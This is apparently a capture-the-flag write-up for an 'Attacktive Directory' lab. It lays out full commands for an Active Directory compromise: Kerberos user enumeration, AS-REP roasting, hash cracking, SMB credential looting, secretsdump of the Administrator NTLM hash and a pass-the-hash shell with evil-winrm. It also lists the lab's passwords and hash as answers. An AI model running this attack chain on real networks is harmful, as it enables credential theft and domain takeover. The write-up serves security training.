### TASK 3: Welcome to Attacktive Directory

### [ What tool will allow us to enumerate port 139/445? ]

Let's first conduct an **Nmap** scan on the target machine.

```
sudo nmap -sC -sV -vv -p- -T4 10.10.204.177
```

**Results:**

<img style="float: left;" src="screenshots/screenshot1.png">

We can see that port 139 is running **netbios-ssn**. This indicates that there is a Samba server running on the machine, which can be enumerated with **enum4linux**. 

---

### [ What is the NetBIOS-Domain Name of the machine? ]

While **enum4linux** will help us obtain more information about the machine, our nmap scan has already revealed the NetBIOS-Domain Name.

<img style="float: left;" src="screenshots/screenshot2.png">

NetBIOS-Domain Name: **spookysec.local**

---

### [ What invalid TLD do people commonly use for their Active Directory Domain? ]

Doing some research online, I found the following website: https://wiki.samba.org/index.php/Active_Directory_Naming_FAQ

<img style="float: left;" src="screenshots/screenshot3.png">

An invalid TLD people commonly use for their active directory domain: **.local**.

---

### TASK 4: Enumerating Users via Kerberos 

### [ What command within Kerbrute will allow us to enumerate valid usernames? ]

We first install Kerbrute onto our local machine (https://github.com/ropnop/kerbrute). 

We can then find out the command to enumerate valid usernames using the help menu of Kerbrute.

```
/opt/kerbrute -h
```

<img style="float: left;" src="screenshots/screenshot4.png">

Command: **userenum**

---

### [ What notable account is discovered? (These should jump out at you) ]

Before running Kerbrute, we first have to add the **'spookysec.local'** domain to our **/etc/hosts** file.

<img style="float: left;" src="screenshots/screenshot5.png">

We then run Kerbrute like so:

```
/opt/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

The `--dc` option is specify the location of the Domain Controller. The `-d` option is to specify the domain name.

**Results:**

<img style="float: left;" src="screenshots/screenshot6.png">

Notable account: **svc-admin**

---

### [ What is the other notable account is discovered? (These should jump out at you) ]

Other notable account: **backup**

---

### TASK 5: Abusing Kerberos 

### [ We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password? ]

After installing **impacket** onto our local machine, we can use the **GetNPUsers.py** script located in the **/impacket/examples**.

Let's try it with the svc-admin account first.

```
python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
```

**Results:**

<img style="float: left;" src="screenshots/screenshot7.png">

The script worked! This means that the **svc-admin** account does not require pre-authentication, allowing us to obtain a valid kerberos ticket for the account.

If we try running the same script on the **backup** user, we can see that it requires pre-authentication.

<img style="float: left;" src="screenshots/screenshot22.png">

User account that we can query a ticket from with no password: **svc-admin**

---

### [ Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name) ]

From the Hashcat Wikipedia: https://hashcat.net/wiki/doku.php?id=example_hashes

<img style="float: left;" src="screenshots/screenshot8.png">

Hash type: **Kerberos 5, etype 23, AS-REP**

---

### [ What mode is the hash? ]

The mode is the number that is beside the name of the hash.

Mode: **18200**

---

### [ Now crack the hash with the modified password list provided, what is the user accounts password? ]

Instead of using Hashcat to crack the hash, I decided to use **John the Ripper** instead. I saved the hash into a text file called **hash.txt**.

Then, I ran John with the supplied password wordlist.

```
john --wordlist=passwordlist.txt --format=krb5asrep hash.txt
```

**Results:**

<img style="float: left;" src="screenshots/screenshot9.png">

User account's password: **management2005**

---

### TASK 6: Back to the Basics 

### [ What utility can we use to map remote SMB shares? ]

We can use **smbclient** to map remote SMB shares.

---

### [ Which option will list shares? ]

The **man** page for smbclient shows the option that will list shares.

<img style="float: left;" src="screenshots/screenshot10.png">

option: **-L**

---

### [ How many remote shares is the server listing? ]

With svc-admin's account, we can use smbclient to find out the shares that svc-admin can access.

```
smbclient -L spookysec.local -U svc-admin
```

**Results:**

<img style="float: left;" src="screenshots/screenshot11.png">

From the results, we can see that the server is listing **6** shares.

---

### [ There is one particular share that we have access to that contains a text file. Which share is it? ]

After trying to log into the various shares, I managed to find a text file within the **backup** share.

```
smbclient //spookysec.local/backup -U svc-admin
```

<img style="float: left;" src="screenshots/screenshot12.png">

---

### [ What is the content of the file? ]

We can download the **backup_credentials.txt** file onto our local machine using the `get` command.

**Contents:**

<img style="float: left;" src="screenshots/screenshot13.png">

---

### [ Decoding the contents of the file, what is the full contents? ]

I realized that the content in backup_credentials.txt is actually **base64 encoded**. We can decode it like so:

```
echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
```

**Results:**

<img style="float: left;" src="screenshots/screenshot14.png">

Nice! We've found the credentials for the **backup** account.

---

### TASK 7: Elevating Privileges within the Domain 

### [ What method allowed us to dump NTDS.DIT? ]

Read the help page for **secretsdump.py** (found in /impacket/examples/secretsdump.py):

<img style="float: left;" src="screenshots/screenshot15.png">

The method that allows us to dump NTDS.DIT is **DRSUAPI**.

---

### [ What is the Administrators NTLM hash? ]

We can use secretsdump.py like so:

```
python3 /opt/impacket/examples/secretsdump.py -just-dc-user Administrator spookysec.local/backup:backup2517860
```

**Results:**

<img style="float: left;" src="screenshots/screenshot16.png">

The NTLM hash is the part that is underlined in red: **0e0363213e37b94221497260b0bcb4fc**

---

### [ What method of attack could allow us to authenticate as the user without the password? ]

Doing some research online, I found out that a possible method of attack is called: **pass the hash**

*A **Pass-the-Hash (PtH) attack** is a technique whereby an attacker captures a password hash (as opposed to the password characters) and then simply passes it through for authentication and potentially lateral access to other networked systems. The threat actor doesnâ€™t need to decrypt the hash to obtain a plain text password.*

---

### [ Using a tool called Evil-WinRM what option will allow us to use a hash? ]

Download the Evil-WinRM tool from: https://github.com/Hackplayers/evil-winrm

We can look at the help page for evil-winrm to find out the needed option.

<img style="float: left;" src="screenshots/screenshot17.png">

Option to use a hash: **-H**

---

### TASK 8: Flag Submission Panel 

### [ svc-admin ]

We can use the hash that we found earlier to log into the **Administrator** account with evil-winrm. evil-winrm will spawn a shell for us, which will allows us to explore the machine.

```
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

<img style="float: left;" src="screenshots/screenshot18.png">

And we're in!

Since we are in the Administrator account, we have free access into any of the other users' directories. The flag for svc-admin can be found in his desktop.
